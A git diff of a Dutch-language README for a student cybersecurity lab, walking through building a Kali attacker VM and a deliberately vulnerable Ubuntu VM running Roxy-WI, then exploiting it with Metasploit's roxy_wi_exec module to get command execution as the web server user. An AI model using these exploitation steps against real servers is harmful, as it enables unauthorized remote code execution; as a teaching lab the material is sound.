@@ -27,10 +27,14 @@ We gebruiken alvast het volgende:
 
 - Maak een folder aan in je C: schijf directory genaamd *NPECybersecurity*, met subdirectories *sharedfolder* en *medium*.
 - Sleep de 2 .vdi bestanden en de GA .iso disk hier naar toe.
+  
 <img width="584" alt="directories" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/097355e6-d0d7-42a6-a5fe-69685ac85d87">
+
 - Uit de repository, download en run de PS1 scriptjes: `./Cybersecurity_NPE_Kali.ps1` en `./Cybersecurity_NPE_Ubuntu (Vulnerable).ps1`.
 - De virtuele machines worden nu aangemaakt, na het opstarten van de VMs kan je inloggen met credentials `osboxes` en `osboxes.org`.
+  
 <img width="175" alt="ubuntuinlog" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/799ca501-8213-4b56-a812-996c77b4b5aa">
+
 Ter info: De virtuele machines gebruiken **bridged adapters**, en we gebruiken simpelweg DHCP om de IP-adressen in te stellen, in plaats van dit statisch te doen. Voer dus zeker eens het commando `ip a` uit om de IP-adressen op te halen van de 2 VMs.
 
 **Stap 2: Het opstellen van de omgeving in de Ubuntu VM**
@@ -40,10 +44,13 @@ Ter info: De virtuele machines gebruiken **bridged adapters**, en we gebruiken s
 - Om Guest Additions te installeren, moeten we eerst het volgende uitvoeren: `sudo apt install build-essential linux-headers-$(uname -r) -y`
 - Run het script `autorun.sh` op de Guest Additions CD.
 - Ga naar de Desktop `cd Desktop` en clone de repository `git clone https://github.com/sudojelle/NPE-Cybersecurity-23-24-`
+  
 <img width="423" alt="clonerepo" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/f4fdd255-6297-4183-aedb-cad47261e78e">
+
 - Voer het script `./opzetten_omgeving` uit.
 - Wacht een beetje, en kijk daarna eens via `cd /var/www/` of de ha-proxy directory is aangemaakt.
-- Surf naar `https://ip_adres`, normaal bekom je het volgende: 
+- Surf naar `https://ip_adres`, normaal bekom je het volgende:
+  
 <img width="371" alt="roxywiinlog" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/0b338b67-37e0-4290-891e-cea0f969ea7e">
 
 
@@ -52,13 +59,21 @@ Ter info: De virtuele machines gebruiken **bridged adapters**, en we gebruiken s
 - Open de terminal.
 - Gebruik `ip a` om je IP-adres te achterhalen.
 - Start het Metasploit Framework met `msfconsole`
+  
 <img width="381" alt="msf1" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/6578987f-1b7c-4e63-87f8-c7a9ca492f41">
+
 - Doe `use exploit/linux/http/roxy_wi_exec`
+  
 <img width="329" alt="msf2" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/c45259c3-8f4a-46a8-9aff-1e50e5efdde6">
+
 - Met het `set` commando: zet de **RHOST** op het **IP-adres van de Ubuntu client** en zet de **LHOST** op het **IP-adres van de Kali client**.
+  
 <img width="392" alt="msf3" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/86e46857-8a9b-48de-a3b0-62f64f92f73b">
+
 - Doe nu `exploit`
+  
 <img width="498" alt="msf4" src="https://github.com/sudojelle/NPE-Cybersecurity-23-24-/assets/126736772/3d94df04-afbe-4953-af11-4deb396644d8">
+
 - Nu zou je commando's moeten kunnen executen onder de context van de webserver user.
 
 ## Technische details
